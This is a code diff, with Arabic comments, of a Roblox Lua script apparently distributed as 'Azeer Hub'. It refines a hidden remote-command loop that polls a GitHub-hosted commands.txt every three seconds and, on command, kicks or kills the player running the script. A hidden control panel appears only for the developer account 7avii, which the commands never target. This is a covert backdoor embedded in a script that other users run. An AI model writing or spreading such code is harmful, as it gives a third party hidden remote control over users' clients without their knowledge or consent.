@@ -4,35 +4,50 @@ local LocalPlayer = Players.LocalPlayer
 -- اسم حسابك كأدمن وحيد للسكربت
 local AdminName = "7avii"
 
--- ضع هنا رابط الـ Raw لملف الأوامر (سأعلمك كيف تصنعه في الخطوة القادمة)
+-- رابط الـ Raw لملف الأوامر في مستودعك
 local CommandUrl = "https://raw.githubusercontent.com/7avii/main.luaa/refs/heads/main/commands.txt"
 
+-- دالة لتنظيف النص من أي فراغات أو أسطر مخفية تأتي من GitHub
+local function trim(s)
+    return s:match("^%s*(.-)%s*$")
+end
+
 -------------------------------------------------------------------
--- [1] نظام الاستقبال التلقائي (يفحص الأوامر من GitHub كل 3 ثوانٍ)
+-- [1] نظام الاستقبال التلقائي المطور (تم إصلاح الفحص والتقطيع)
 -------------------------------------------------------------------
 task.spawn(function()
     while task.wait(3) do
         local success, result = pcall(function()
-            return game:HttpGet(CommandUrl .. "?t=" .. os.time()) -- الـ os.time تمنع روبلوكس من كاش الرابط وتجلب الأمر فوراً
+            -- إضافة معامِل عشوائي متجدد لضمان عدم الكاش وسحب الأمر فوراً
+            return game:HttpGet(CommandUrl .. "?t=" .. math.random(1, 999999))
         end)
         
-        if success and result then
-            -- تقسيم النص لمعرفة الأمر واللاعب المستهدف
-            local data = string.split(result, "|")
-            local command = data[1]
-            local targetName = data[2]
+        if success and result and result ~= "" then
+            -- تنظيف النص الكامل أولاً
+            result = trim(result)
             
-            -- التأكد من أن الأمر موجه للاعب الحالي أو للجميع (all) وأن الأدمن ليس هو المستهدف بالطرد
-            if (targetName == LocalPlayer.Name or targetName == "all") and LocalPlayer.Name ~= AdminName then
+            -- تقسيم النص بمعرف الـ "|"
+            local data = string.split(result, "|")
+            local command = data[1] and trim(string.lower(data[1]))
+            local targetName = data[2] and trim(string.lower(data[2]))
+            
+            if command and targetName then
+                local myName = string.lower(LocalPlayer.Name)
+                local adminNameLower = string.lower(AdminName)
                 
-                -- 1. أمر الطرد (Kick)
-                if command == "kick" then
-                    LocalPlayer:Kick("🚨 [Azeer Hub]: تم طردك بواسطة المطور 7avii")
+                -- التأكد من أن الأمر موجه للاعب الحالي أو للجميع (all) وأنك لست المستهدف
+                if (targetName == myName or targetName == "all") and myName ~= adminNameLower then
                     
-                -- 2. أمر القتل (Kill)
-                elseif command == "kill" then
-                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                        LocalPlayer.Character.Humanoid.Health = 0
+                    -- 1. أمر الطرد (Kick)
+                    if command == "kick" then
+                        LocalPlayer:Kick("🚨 [Azeer Hub]: تم طردك بواسطة المطور 7avii")
+                        break -- إيقاف الحلقة التكرارية بعد الطرد
+                        
+                    -- 2. أمر القتل (Kill)
+                    elseif command == "kill" then
+                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                            LocalPlayer.Character.Humanoid.Health = 0
+                        end
                     end
                 end
             end
@@ -41,9 +56,9 @@ task.spawn(function()
 end)
 
 -------------------------------------------------------------------
--- [2] واجهة التحكم الرسومية (تظهر لك أنت فقط 7avii)
+-- [2] واجهة التحكم الرسومية الخاصة بك (تظهر لحساب 7avii فقط)
 -------------------------------------------------------------------
-if LocalPlayer.Name == AdminName then
+if string.lower(LocalPlayer.Name) == string.lower(AdminName) then
     local AdminGui = Instance.new("ScreenGui")
     local Frame = Instance.new("Frame")
     local Title = Instance.new("TextLabel")
@@ -75,8 +90,7 @@ if LocalPlayer.Name == AdminName then
     TargetInput.Size = UDim2.new(0.9, 0, 0, 40)
     TargetInput.Position = UDim2.new(0.05, 0, 0.22, 0)
     TargetInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    TargetInput.PlaceholderText = "Azeer_BOT
-BOT"
+    TargetInput.PlaceholderText = "Azeer_BOT"
     TargetInput.Text = ""
     TargetInput.TextColor3 = Color3.fromRGB(255, 255, 255)
     TargetInput.TextSize = 14
@@ -95,24 +109,27 @@ BOT"
     styleButton(KickBtn, "طرد اللاعب (Kick)", UDim2.new(0.05, 0, 0.45, 0), Color3.fromRGB(150, 0, 0))
     styleButton(KillBtn, "قتل اللاعب (Kill)", UDim2.new(0.05, 0, 0.68, 0), Color3.fromRGB(80, 80, 80))
     
-    -- [ملاحظة مهمة]: التعديل التلقائي لملفات جيتهاب من داخل روبلوكس يتطلب Token وهو غير آمن للوضعه في سكربت عام،
-    -- لذلك الأزرار ستطبع لك الأمر لتغيره بيدك في ملف commands.txt بـ GitHub بـ ثوانٍ، أو يمكنك كتابة كلمة "all" لتطبيق الأمر على الجميع.
+    -- إظهار الإشعار والتعليمات عند الضغط على الأزرار
     KickBtn.MouseButton1Click:Connect(function()
-        local target = TargetInput.Text ~= "" and TargetInput.Text or "all"
-        print("انسخ هذا واكتبه في ملف commands.txt -> :  kick|" .. target)
-        -- تنبيه للشاشة
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "7avii Admin", Text = "اكتب في commands.txt:\nkick|" .. target, Duration = 5})
+        local target = TargetInput.Text ~= "" and trim(TargetInput.Text) or "all"
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "7avii Admin",
+            Text = "اكتب في commands.txt:\nkick|" .. target,
+            Duration = 5
+        })
     end)
     
     KillBtn.MouseButton1Click:Connect(function()
-        local target = TargetInput.Text ~= "" and TargetInput.Text or "all"
-        print("انسخ هذا واكتبه في ملف commands.txt -> :  kill|" .. target)
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "7avii Admin", Text = "اكتب في commands.txt:\nkill|" .. target, Duration = 5})
+        local target = TargetInput.Text ~= "" and trim(TargetInput.Text) or "all"
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "7avii Admin",
+            Text = "اكتب في commands.txt:\nkill|" .. target,
+            Duration = 5
+        })
     end)
 end
 
 -------------------------------------------------------------------
--- [3] كود واجهة Azeer Hub الأساسية الخاصة بك يكمل هنا بشكل طبيعي:
+-- [3] كود واجهة Azeer Hub الأساسية
 -------------------------------------------------------------------
 print("Azeer Hub Loaded Successfully!")
-
